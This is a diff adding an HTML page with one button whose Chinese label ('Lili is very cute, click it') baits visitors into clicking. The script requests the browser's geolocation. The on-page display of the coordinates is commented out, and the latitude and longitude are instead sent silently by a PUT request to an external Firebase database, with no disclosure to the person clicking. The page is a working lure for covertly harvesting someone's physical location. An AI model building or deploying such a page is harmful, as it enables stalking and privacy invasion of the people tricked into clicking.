@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    
+
+<button onclick="getLocation()">李李很可愛就點下去</button>
+
+<p id="demo"></p>
+
+<script>
+const x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+//   x.innerHTML = "Latitude: " + position.coords.latitude + 
+//   "<br>Longitude: " + position.coords.longitude;
+  sendData(position.coords.latitude,position.coords.longitude)
+}
+
+async function sendData(xL,yL){
+    const response  = await fetch("https://getlocation-4fdc2-default-rtdb.firebaseio.com/data.json",{
+        method:"PUT",
+        body:JSON.stringify({x:xL,y:yL})
+    });
+
+    let data = await response.json();
+    console.log(data);
+}
+
+</script>
+
+</body>
+</html>
